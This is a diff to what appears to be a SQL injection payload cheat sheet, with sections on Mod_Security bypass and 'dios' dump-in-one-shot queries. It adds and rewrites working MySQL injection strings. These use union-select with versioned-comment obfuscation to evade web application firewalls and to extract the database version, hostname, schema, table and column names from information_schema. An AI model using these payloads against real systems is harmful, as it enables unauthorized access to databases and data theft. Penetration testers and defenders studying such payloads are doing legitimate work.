@@ -1071,6 +1071,8 @@ CONCAT(Tablas <br>,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFO
 
 /*!50000and*/ /*!50000extractvalue*/(0x0a,/*!50000concat(0x0a,(select JSON_OBJECT(1, current_user())))*/)
 
+%27+or%20.0union/**/distinctrow%23GearFourth%0aselect/**/distinctrow%20
+
 ```
 
 ### Sql inyection payload + dios + Mod_Security bypass
@@ -1086,8 +1088,10 @@ CONCAT(Tablas <br>,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFO
 ### Sql databases and tables
 
 ```
-%27+or%20.0union/**/distinctrow%23GearFourth%0aselect/**/distinctrow%201,2,/*!50000COnCaT/**8**/*/(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,@@version,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,@@hostname,0x3c62723e,0x3c703e446174616261736573203a203c2f703e,(select%20grouP_ConCat(/*!50000schema_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),0x3c62723e,0x3c703e5461626c6573203a203c2f703e,(select%20grouP_ConCat(/*!50000table_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.TabLes*/)),4,5,6,7,8,9,10,11,12--+-
+/*!50000COnCaT/**8**/*/(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,@@version,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,@@hostname,0x3c62723e,0x3c703e446174616261736573203a203c2f703e,(select%20grouP_ConCat(/*!50000schema_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),0x3c62723e,0x3c703e5461626c6573203a203c2f703e,(select%20grouP_ConCat(/*!50000table_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.TabLes*/))
 
+
+concat(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,@@version,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,@@hostname,0x3c62723e,0x3c703e446174616261736573203a203c2f703e,(select%20grouP_ConCat(/*!50000schema_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x))
 ```
 
 ### Sql inyection payload + url encode 
